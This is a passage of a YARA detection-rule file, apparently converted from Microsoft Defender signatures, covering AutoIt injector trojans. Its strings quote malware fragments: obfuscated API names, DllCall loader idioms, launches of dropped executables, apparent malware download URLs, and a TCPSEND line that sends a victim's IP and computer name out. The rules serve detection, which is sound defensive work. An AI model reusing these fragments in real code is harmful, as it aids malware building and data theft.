        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ZXAA_2147923992_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ZXAA!MTB"
        threat_id = "2147923992"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Te\" & \"mpDir" ascii //weight: 1
        $x_1_2 = "D\" & \"ll\" & \"C\" & \"all" ascii //weight: 1
        $x_2_3 = "kgewitegewitrgewitngewitegewitlgewit3gewit2gewit.gewitdgewitlgewitlgewit" ascii //weight: 2
        $x_2_4 = "VgewitigewitrgewittgewitugewitagewitlgewitPgewitrgewitogewittgewitegewitcgewittgewit" ascii //weight: 2
        $x_2_5 = "ugewitsgewitegewitrgewit3gewit2gewit.gewitdgewitlgewitlgewit" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NQ_2147923995_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NQ!MTB"
        threat_id = "2147923995"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "= EXECUTE ( \"FileOpen(@TempDir &" ascii //weight: 3
        $x_1_2 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 53 00 65 00 74 00 44 00 61 00 74 00 61 00 28 00 24 00 [0-47] 2c 00 20 00 31 00 2c 00 20 00 24 00 [0-47] 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_3 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 53 65 74 44 61 74 61 28 24 [0-47] 2c 20 31 2c 20 24 [0-47] 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 47 00 65 00 74 00 50 00 74 00 72 00 28 00 24 00 [0-47] 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 47 65 74 50 74 72 28 24 [0-47] 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_6 = {26 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 46 00 54 00 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 24 00 [0-47] 20 00 2d 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {26 3d 20 53 54 52 49 4e 47 4c 45 46 54 20 28 20 24 [0-47] 20 2c 20 24 [0-47] 20 2d 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_8 = "CIS5XaIS5XlIS5XlIS5XWIS5XiIS5XnIS5XdIS5XoIS5XwIS5XPIS5XrIS5XoIS5XcIS5X" ascii //weight: 1
        $x_1_9 = "kIS5XeIS5XrIS5XnIS5XeIS5XlIS5X3IS5X2IS5X" ascii //weight: 1
        $x_1_10 = "bIS5XyIS5XtIS5XeIS5X[IS5X" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((9 of ($x_1_*))) or
            ((1 of ($x_3_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NQ_2147923995_1
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NQ!MTB"
        threat_id = "2147923995"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "13"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "WinDetectHiddenText" ascii //weight: 1
        $x_2_2 = "http://w347302.s98.ufhosted.com/downaorb.txt" ascii //weight: 2
        $x_1_3 = "FILEDELETE ( @SYSTEMDIR & \"\\netportz.txt\" )" ascii //weight: 1
        $x_1_4 = "$URL , 0 , 0 ) & \"/Plxzz/dllzq.txt\" , @SCRIPTDIR" ascii //weight: 1
        $x_1_5 = "LOCAL $TMP_DAT , $UTF_16 , $TMP1 , $TMP" ascii //weight: 1
        $x_1_6 = "LOCAL $Y [ 16 ] = [ \"0\" , \"1\" , \"2\" , \"3\" , \"4\" , \"5\" , \"6\" , \"7\" , \"8\" , \"9\" , \"A\" , \"B\" , \"C\" , \"D\" , \"E\" , \"F\" ]" ascii //weight: 1
        $x_1_7 = "LOCAL $H [ 16 ] = [ \"9\" , \"F\" , \"D\" , \"E\" , \"C\" , \"B\" , \"A\" , \"8\" , \"7\" , \"6\" , \"5\" , \"4\" , \"3\" , \"2\" , \"1\" , \"0\" ]" ascii //weight: 1
        $x_1_8 = "FOR $S = 1 TO $LEN" ascii //weight: 1
        $x_1_9 = "$TMP1 = STRINGMID ( $UTF_16 , $S , 1 )" ascii //weight: 1
        $x_1_10 = "FOR $I = 0 TO 15" ascii //weight: 1
        $x_1_11 = "$TMP = STRINGREPLACE ( $TMP1 , $H [ $I ] , $Y [ $I ] )" ascii //weight: 1
        $x_1_12 = "TCPSEND ( $HCLIENT , $IP & \"%\" & @IPADDRESS1 & \"%\" & @COMPUTERNAME &" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_NR_2147923996_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NR!MTB"
        threat_id = "2147923996"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "9"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "= EXECUTE ( \"FileOpen(@TempDir &" ascii //weight: 3
        $x_1_2 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 53 00 65 00 74 00 44 00 61 00 74 00 61 00 28 00 24 00 [0-47] 2c 00 20 00 31 00 2c 00 20 00 24 00 [0-47] 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_3 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 53 65 74 44 61 74 61 28 24 [0-47] 2c 20 31 2c 20 24 [0-47] 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_4 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 53 00 74 00 72 00 75 00 63 00 74 00 47 00 65 00 74 00 50 00 74 00 72 00 28 00 24 00 [0-47] 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_5 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 53 74 72 75 63 74 47 65 74 50 74 72 28 24 [0-47] 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_6 = {26 00 3d 00 20 00 53 00 54 00 52 00 49 00 4e 00 47 00 4c 00 45 00 46 00 54 00 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 24 00 [0-47] 20 00 2d 00 20 00 31 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_7 = {26 3d 20 53 54 52 49 4e 47 4c 45 46 54 20 28 20 24 [0-47] 20 2c 20 24 [0-47] 20 2d 20 31 20 29}  //weight: 1, accuracy: Low
        $x_1_8 = "bhxquyhxquthxquehxqu[hxqu" ascii //weight: 1
        $x_1_9 = "khxquehxqurhxqunhxquehxqulhxqu3hxqu2hxqu" ascii //weight: 1
        $x_1_10 = "ChxquahxqulhxqulhxquWhxquihxqunhxqudhxquohxquwhxquPhxqurhxquohxquchxqu" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((9 of ($x_1_*))) or
            ((1 of ($x_3_*) and 6 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_SOV_2147924060_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.SOV!MTB"
        threat_id = "2147924060"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 00 20 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 46 00 69 00 6c 00 22 00 20 00 26 00 20 00 22 00 65 00 4f 00 22 00 20 00 26 00 20 00 22 00 70 00 65 00 22 00 20 00 26 00 20 00 22 00 6e 00 28 00 40 00 54 00 65 00 22 00 20 00 26 00 20 00 22 00 6d 00 70 00 44 00 69 00 72 00 20 00 26 00 20 00 22 00 22 00 5c 00 [0-47] 22 00 22 00 2c 00 20 00 31 00 38 00 29 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 45 58 45 43 55 54 45 20 28 20 22 46 69 6c 22 20 26 20 22 65 4f 22 20 26 20 22 70 65 22 20 26 20 22 6e 28 40 54 65 22 20 26 20 22 6d 70 44 69 72 20 26 20 22 22 5c [0-47] 22 22 2c 20 31 38 29 22 20 29}  //weight: 1, accuracy: Low
        $x_1_3 = {46 00 49 00 4c 00 45 00 4f 00 50 00 45 00 4e 00 20 00 28 00 20 00 24 00 [0-31] 20 00 2c 00 20 00 38 00 31 00 34 00 32 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_4 = {46 49 4c 45 4f 50 45 4e 20 28 20 24 [0-31] 20 2c 20 38 31 34 32 20 29}  //weight: 1, accuracy: Low
        $x_1_5 = {46 00 49 00 4c 00 45 00 57 00 52 00 49 00 54 00 45 00 20 00 28 00 20 00 [0-31] 20 00 2c 00 20 00 22 00 [0-31] 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_6 = {46 49 4c 45 57 52 49 54 45 20 28 20 [0-31] 20 2c 20 22 [0-31] 22 20 29}  //weight: 1, accuracy: Low
        $x_1_7 = {52 00 45 00 54 00 55 00 52 00 4e 00 20 00 [0-47] 20 00 28 00 20 00 24 00 [0-47] 20 00 2c 00 20 00 22 00 67 00 65 00 77 00 69 00 74 00 22 00 20 00 2c 00 20 00 22 00 22 00 20 00 29 00}  //weight: 1, accuracy: Low
        $x_1_8 = {52 45 54 55 52 4e 20 [0-47] 20 28 20 24 [0-47] 20 2c 20 22 67 65 77 69 74 22 20 2c 20 22 22 20 29}  //weight: 1, accuracy: Low
        $x_1_9 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 22 00 20 00 26 00 20 00 22 00 6c 00 22 00 20 00 26 00 20 00 22 00 6c 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 6c 00 6c 00 28 00 [0-31] 28 00 22 00 22 00 75 00 67 00 65 00 77 00 69 00 74 00 73 00 67 00 65 00 77 00 69 00 74 00 65 00 67 00 65 00 77 00 69 00 74 00 72 00 67 00 65 00 77 00 69 00 74 00 33 00 67 00 65 00 77 00 69 00 74 00 32 00 67 00 65 00 77 00 69 00 74 00}  //weight: 1, accuracy: Low
        $x_1_10 = {45 58 45 43 55 54 45 20 28 20 22 44 22 20 26 20 22 6c 22 20 26 20 22 6c 43 22 20 26 20 22 61 6c 6c 28 [0-31] 28 22 22 75 67 65 77 69 74 73 67 65 77 69 74 65 67 65 77 69 74 72 67 65 77 69 74 33 67 65 77 69 74 32 67 65 77 69 74}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (5 of ($x*))
}

rule Trojan_Win32_AutoitInject_NS_2147924411_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NS!MTB"
        threat_id = "2147924411"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "EXECUTE ( \"FileOpen(@TempDir &" ascii //weight: 3
        $x_1_2 = "EXECUTE ( \"DllStructCreate(" ascii //weight: 1
        $x_1_3 = "&= STRINGMID" ascii //weight: 1
        $x_1_4 = "ks55sces55scrs55scns55sces55scls55sc3s55sc2s55sc" ascii //weight: 1
        $x_1_5 = "Cs55scas55scls55scls55scWs55scis55scns55scds55scos55scws55scPs55scrs55scos55sccs55sc" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ALBA_2147924447_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ALBA!MTB"
        threat_id = "2147924447"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "High"
    strings:
        $x_3_1 = "SHELLEXECUTE ( @WORKINGDIR & \"\\vxQSYfert\\qWRpviqXj.exe\" )" ascii //weight: 3
        $x_2_2 = "SHELLEXECUTE ( @WORKINGDIR & \"\\vxQSYfert\\MADUSANKA VIDEO MUSIC &" ascii //weight: 2
        $x_2_3 = "MOBILE CENTER @ (PADIYAPELELLA ) SINHALA NEW  SONG & 076-877 25 32- 072 877 25 32" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_ASE_2147924635_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASE!MTB"
        threat_id = "2147924635"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {53 00 48 00 45 00 4c 00 4c 00 45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 40 00 57 00 4f 00 52 00 4b 00 49 00 4e 00 47 00 44 00 49 00 52 00 20 00 26 00 20 00 22 00 5c 00 69 00 79 00 47 00 52 00 44 00 61 00 6e 00 79 00 62 00 [0-64] 2e 00 65 00 78 00 65 00 22 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_2 = {53 48 45 4c 4c 45 58 45 43 55 54 45 20 28 20 40 57 4f 52 4b 49 4e 47 44 49 52 20 26 20 22 5c 69 79 47 52 44 61 6e 79 62 [0-64] 2e 65 78 65 22 20 29}  //weight: 2, accuracy: Low
        $x_2_3 = "SHELLEXECUTE ( @WORKINGDIR & \"\\iyGRDanyb\\dYIoaczdR.exe\" )" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule Trojan_Win32_AutoitInject_ASBA_2147924661_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.ASBA!MTB"
        threat_id = "2147924661"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "7"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "@TEMPDIR &" ascii //weight: 1
        $x_2_2 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 [0-20] 20 00 28 00 20 00 22 00 68 00 68 00 6f 00 71 00 62 00 6f 00 30 00 35 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 00 20 00 28 00 20 00 22 00 6d 00 77 00 6f 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 00 20 00 28 00 20 00 22 00 53 00 6c 00 6f 00 77 00 72 00 64 00 69 00 44 00 69 00 6f 00 6c 00 66 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 00 20 00 28 00 20 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00}  //weight: 2, accuracy: Low
        $x_2_3 = {44 4c 4c 43 41 4c 4c 20 28 20 [0-20] 20 28 20 22 68 68 6f 71 62 6f 30 35 22 20 2c 20 33 20 29 20 2c 20 00 20 28 20 22 6d 77 6f 22 20 2c 20 33 20 29 20 2c 20 00 20 28 20 22 53 6c 6f 77 72 64 69 44 69 6f 6c 66 22 20 2c 20 33 20 29 20 2c 20 00 20 28 20 22 61 7a 6c 75 61 22 20 2c 20 33 20 29}  //weight: 2, accuracy: Low
        $x_2_4 = {28 00 20 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 24 00 [0-20] 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 2d 00 7b 00 30 00 33 00 2d 00 33 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 61 00 7a 00 6c 00 75 00 61 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 2c 00 20 00 [0-20] 20 00 28 00 20 00 22 00 2d 00 7b 00 31 00 33 00 22 00 20 00 2c 00 20 00 33 00 20 00 29 00 20 00 29 00 20 00 5b 00 20 00 30 00 20 00 5d 00}  //weight: 2, accuracy: Low
        $x_2_5 = {28 20 22 61 7a 6c 75 61 22 20 2c 20 33 20 29 20 2c 20 [0-20] 20 28 20 24 [0-20] 20 29 20 2c 20 [0-20] 20 28 20 22 61 7a 6c 75 61 22 20 2c 20 33 20 29 20 2c 20 [0-20] 20 28 20 22 2d 7b 30 33 2d 33 22 20 2c 20 33 20 29 20 2c 20 [0-20] 20 28 20 22 61 7a 6c 75 61 22 20 2c 20 33 20 29 20 2c 20 [0-20] 20 28 20 22 2d 7b 31 33 22 20 2c 20 33 20 29 20 29 20 5b 20 30 20 5d}  //weight: 2, accuracy: Low
        $x_2_6 = {44 00 4c 00 4c 00 43 00 41 00 4c 00 4c 00 20 00 28 00 20 00 22 00 75 00 73 00 65 00 72 00 33 00 32 00 2e 00 64 00 6c 00 6c 00 22 00 20 00 2c 00 20 00 22 00 6c 00 72 00 65 00 73 00 75 00 6c 00 74 00 22 00 20 00 2c 00 20 00 22 00 43 00 61 00 6c 00 6c 00 57 00 69 00 6e 00 64 00 6f 00 77 00 50 00 72 00 6f 00 63 00 22 00 20 00 2c 00 20 00 22 00 70 00 74 00 72 00 22 00 20 00 2c 00 20 00 24 00 [0-20] 20 00 2b 00 20 00 39 00 31 00 33 00 36 00 20 00}  //weight: 2, accuracy: Low
        $x_2_7 = {44 4c 4c 43 41 4c 4c 20 28 20 22 75 73 65 72 33 32 2e 64 6c 6c 22 20 2c 20 22 6c 72 65 73 75 6c 74 22 20 2c 20 22 43 61 6c 6c 57 69 6e 64 6f 77 50 72 6f 63 22 20 2c 20 22 70 74 72 22 20 2c 20 24 [0-20] 20 2b 20 39 31 33 36 20}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 1 of ($x_1_*))) or
            ((4 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AYBA_2147924860_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AYBA!MTB"
        threat_id = "2147924860"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TEMPDIR" ascii //weight: 1
        $x_1_2 = "DllC\" & \"all" ascii //weight: 1
        $x_2_3 = "kuvrgeuvrgruvrgnuvrgeuvrgluvrg3uvrg2uvrg.uvrgduvrgluvrgluvrg" ascii //weight: 2
        $x_2_4 = "VuvrgiuvrgruvrgtuvrguuvrgauvrgluvrgPuvrgruvrgouvrgtuvrgeuvrgcuvrgtuvrg" ascii //weight: 2
        $x_2_5 = "uuvrgsuvrgeuvrgruvrg3uvrg2uvrg.uvrgduvrgluvrgluvrg" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMX_2147925018_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMX!MTB"
        threat_id = "2147925018"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_2_1 = {44 00 6c 00 6c 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 6b 00 66 00 76 00 62 00 68 00 79 00 65 00 66 00 76 00 62 00 68 00 79 00 72 00 66 00 76 00 62 00 68 00 79 00 6e 00 66 00 76 00 62 00 68 00 79 00 65 00 66 00 76 00 62 00 68 00 79 00 6c 00 66 00 76 00 62 00 68 00 79 00 33 00 66 00 76 00 62 00 68 00 79 00 32 00 66 00 76 00 62 00 68 00 79 00 2e 00 66 00 76 00 62 00 68 00 79 00 64 00 66 00 76 00 62 00 68 00 79 00 6c 00 66 00 76 00 62 00 68 00 79 00 6c 00 66 00 76 00 62 00 68 00 79 00 22 00 22 00 29 00 2c 00 20 00 00 28 00 22 00 22 00}  //weight: 2, accuracy: Low
        $x_2_2 = {44 6c 6c 43 22 20 26 20 22 61 6c 6c 28 [0-20] 28 22 22 6b 66 76 62 68 79 65 66 76 62 68 79 72 66 76 62 68 79 6e 66 76 62 68 79 65 66 76 62 68 79 6c 66 76 62 68 79 33 66 76 62 68 79 32 66 76 62 68 79 2e 66 76 62 68 79 64 66 76 62 68 79 6c 66 76 62 68 79 6c 66 76 62 68 79 22 22 29 2c 20 00 28 22 22}  //weight: 2, accuracy: Low
        $x_1_3 = "ufvbhysfvbhyefvbhyrfvbhy3fvbhy2fvbhy.fvbhydfvbhylfvbhylfvbhy" ascii //weight: 1
        $x_1_4 = "\"\"fvbhy\"\", \"\"\"\"" ascii //weight: 1
        $x_1_5 = "@TEMPDIR" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 3 of ($x_1_*))) or
            ((2 of ($x_2_*) and 1 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_AMY_2147925330_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMY!MTB"
        threat_id = "2147925330"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_4_1 = {68 00 74 00 74 00 70 00 3a 00 2f 00 2f 00 22 00 20 00 26 00 20 00 59 00 49 00 48 00 55 00 4f 00 20 00 28 00 20 00 24 00 55 00 52 00 4c 00 20 00 2c 00 20 00 30 00 20 00 2c 00 20 00 30 00 20 00 29 00 20 00 26 00 20 00 22 00 2f 00 67 00 65 00 74 00 69 00 70 00 2e 00 61 00 73 00 70 00 22 00 20 00 2c 00 20 00 22 00 68 00 [0-5] 70 00 3a 00 2f 00 2f 00 77 00 77 00 77 00 [0-3] 61 00 61 00 6d 00 61 00 69 00 6c 00 73 00 6f 00 66 00 74 00 2e 00 63 00 6f 00 6d 00 2f 00 67 00 65 00 74 00 69 00 70 00 2e 00 70 00 68 00 70 00}  //weight: 4, accuracy: Low
        $x_4_2 = {68 74 74 70 3a 2f 2f 22 20 26 20 59 49 48 55 4f 20 28 20 24 55 52 4c 20 2c 20 30 20 2c 20 30 20 29 20 26 20 22 2f 67 65 74 69 70 2e 61 73 70 22 20 2c 20 22 68 [0-5] 70 3a 2f 2f 77 77 77 [0-3] 61 61 6d 61 69 6c 73 6f 66 74 2e 63 6f 6d 2f 67 65 74 69 70 2e 70 68 70}  //weight: 4, accuracy: Low
        $x_1_3 = "http://\" & YIHUO ( $URL , 0 , 0 ) & \"/zqzqs.txt\" )" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_4_*) and 1 of ($x_1_*))) or
            ((2 of ($x_4_*))) or
            (all of ($x*))
        )
}

rule Trojan_Win32_AutoitInject_NU_2147925668_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.NU!MTB"
        threat_id = "2147925668"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_2_1 = "= STRINGSPLIT ( \"3,1,4,1,5,9,2,6,5,3,5,8,9,7,9\" , \",\" )" ascii //weight: 2
        $x_1_2 = "&= EXECUTE ( \"Ch\" & \"r(BitA\" & \"ND(Asc(String\" & \"Mid" ascii //weight: 1
        $x_1_3 = "= EXECUTE ( \"Fil\" & \"eO\" & \"pe\" & \"n(@Te\" & \"mpDir &" ascii //weight: 1
        $x_1_4 = "YjvuzjnGqotk" ascii //weight: 1
        $x_1_5 = "gxssi" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AQCA_2147925732_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AQCA!MTB"
        threat_id = "2147925732"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "8"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "@TEMPDIR" ascii //weight: 1
        $x_1_2 = "DLLCALL" ascii //weight: 1
        $x_2_3 = "k622005e622005r622005n622005e622005l62200536220052622005.622005d622005l622005l622005" ascii //weight: 2
        $x_2_4 = "V622005i622005r622005t622005u622005a622005l622005P622005r622005o622005t622005e622005c622005t622005" ascii //weight: 2
        $x_2_5 = "u622005s622005e622005r62200536220052622005.622005d622005l622005l622005" ascii //weight: 2
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule Trojan_Win32_AutoitInject_AMAA_2147925736_0
{
    meta:
        author = "defender2yara"
        detection_name = "Trojan:Win32/AutoitInject.AMAA!MTB"
        threat_id = "2147925736"
        type = "Trojan"
        platform = "Win32: Windows 32-bit platform"
        family = "AutoitInject"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_AUTOITHSTR_EXT"
        threshold = "15"
        strings_accuracy = "Low"
    strings:
        $x_5_1 = {45 00 58 00 45 00 43 00 55 00 54 00 45 00 20 00 28 00 20 00 22 00 44 00 6c 00 6c 00 43 00 22 00 20 00 26 00 20 00 22 00 61 00 6c 00 6c 00 28 00 [0-20] 28 00 22 00 22 00 68 00 68 00 6f 00 71 00 62 00 22 00 20 00 26 00 20 00 [0-30] 2c 00 20 00 33 00 29 00 2c 00 20 00 00 28 00 22 00 22 00 6d 00 77 00 6f 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 00 28 00 22 00 22 00 53 00 6c 00 6f 00 77 00 72 00 64 00 69 00 44 00 69 00 6f 00 6c 00 66 00 22 00 22 00 2c 00 20 00 33 00 29 00 2c 00 20 00 00 28 00 22 00 22 00}  //weight: 5, accuracy: Low
        $x_5_2 = {45 58 45 43 55 54 45 20 28 20 22 44 6c 6c 43 22 20 26 20 22 61 6c 6c 28 [0-20] 28 22 22 68 68 6f 71 62 22 20 26 20 [0-30] 2c 20 33 29 2c 20 00 28 22 22 6d 77 6f 22 22 2c 20 33 29 2c 20 00 28 22 22 53 6c 6f 77 72 64 69 44 69 6f 6c 66 22 22 2c 20 33 29 2c 20 00 28 22 22}  //weight: 5, accuracy: Low
        $x_5_3 = "DllC\" & \"all(\"\"use\" & \"r3\" & \"2.d\" & \"ll\"" ascii //weight: 5
        $x_2_4 = "EXECUTE ( \"A\" & \"s\" & \"c\" & \"(StringMid" ascii //weight: 2
